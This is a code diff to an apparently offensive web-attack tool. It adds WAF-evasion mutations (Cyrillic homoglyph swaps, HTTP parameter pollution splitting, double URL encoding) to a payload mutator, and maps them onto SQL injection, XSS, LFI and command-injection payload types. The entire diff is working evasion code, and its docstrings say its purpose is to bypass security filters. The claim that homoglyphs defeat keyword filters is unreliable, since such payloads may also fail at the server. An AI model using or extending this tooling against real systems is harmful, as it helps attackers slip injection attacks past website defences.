@@ -24,6 +24,7 @@ class PayloadMutator:
         'encode_chain', 'case_alternate', 'comment_inject',
         'whitespace_random', 'null_byte', 'concat_split',
         'string_concat', 'js_obfuscate', 'html_entity', 'mixed_encode',
+        'unicode_normalize', 'hpp_split', 'double_encode',
     ]
 
     SQL_KEYWORDS = re.compile(
@@ -160,6 +161,59 @@ class PayloadMutator:
     def _js_constructor(self, payload):
         codes = ','.join(str(ord(c)) for c in payload)
         return f'[].constructor.constructor(String.fromCharCode({codes}))()'
+
+    def _mutate_unicode_normalize(self, payload):
+        """Replace characters with Unicode look-alikes to bypass keyword filters.
+
+        Uses homoglyphs from the Cyrillic, fullwidth, and mathematical
+        alphabets that visually resemble ASCII but have different code points.
+        WAFs that do keyword matching on raw bytes will miss these.
+        """
+        # Map ASCII letters to common Unicode homoglyphs
+        homoglyphs = {
+            'a': '\u0430', 'c': '\u0441', 'e': '\u0435', 'o': '\u043e',
+            'p': '\u0440', 's': '\u0455', 'x': '\u0445', 'y': '\u0443',
+            'A': '\u0410', 'B': '\u0412', 'C': '\u0421', 'E': '\u0415',
+            'H': '\u041d', 'K': '\u041a', 'M': '\u041c', 'O': '\u041e',
+            'P': '\u0420', 'S': '\u0405', 'T': '\u0422', 'X': '\u0425',
+        }
+        result = []
+        for c in payload:
+            if c in homoglyphs and random.random() < 0.4:
+                result.append(homoglyphs[c])
+            else:
+                result.append(c)
+        return ''.join(result)
+
+    def _mutate_hpp_split(self, payload):
+        """Split payload across duplicate HTTP parameters (HPP technique).
+
+        Returns the payload formatted as multiple parameter fragments
+        that, when reassembled by certain server-side frameworks (e.g.
+        ASP.NET concatenates duplicate params with commas), reconstruct
+        the original attack string.
+        """
+        if len(payload) < 4:
+            return payload
+        # Split at a random midpoint
+        mid = random.randint(2, len(payload) - 2)
+        part1 = payload[:mid]
+        part2 = payload[mid:]
+        # URL-encode the parts for safe embedding
+        p1 = urllib.parse.quote(part1, safe='')
+        p2 = urllib.parse.quote(part2, safe='')
+        return f'{p1}&inject={p2}'
+
+    def _mutate_double_encode(self, payload):
+        """Apply double URL encoding to bypass single-decode WAF filters.
+
+        First encodes the payload, then re-encodes the percent signs so
+        that a server performing two decode passes will recover the
+        original value while a WAF doing a single decode will not.
+        """
+        first = urllib.parse.quote(payload, safe='')
+        # Re-encode: replace '%' with '%25' in the already-encoded string
+        return first.replace('%', '%25')
 
     @staticmethod
     def _split_encoded(s):
@@ -430,12 +484,16 @@ class EvasionEngine:
 
     CONTEXT_TECHNIQUES = {
         'sql': ['case_alternate', 'comment_inject', 'whitespace_random',
-                'concat_split', 'null_byte'],
+                'concat_split', 'null_byte', 'unicode_normalize',
+                'double_encode'],
         'xss': ['html_entity', 'js_obfuscate', 'mixed_encode',
-                'encode_chain', 'string_concat'],
-        'lfi': ['encode_chain', 'null_byte', 'mixed_encode'],
+                'encode_chain', 'string_concat', 'unicode_normalize',
+                'double_encode'],
+        'lfi': ['encode_chain', 'null_byte', 'mixed_encode',
+                'double_encode'],
         'cmdi': ['whitespace_random', 'encode_chain', 'null_byte',
-                 'string_concat'],
+                 'string_concat', 'double_encode'],
+        'hpp': ['hpp_split', 'double_encode', 'unicode_normalize'],
         'generic': None,
     }
 
